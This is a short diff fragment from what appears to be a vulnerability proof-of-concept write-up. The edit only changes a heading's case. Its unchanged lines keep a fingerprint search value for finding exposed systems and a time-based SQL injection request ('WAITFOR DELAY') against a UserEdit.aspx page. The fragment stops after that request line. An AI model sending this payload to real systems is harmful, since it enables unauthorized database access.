@@ -8,7 +8,7 @@
 icon_hash="-628229493"
 ```
 
-## poc
+## POC
 
 ```
 POST /Web/SysManage/UserEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
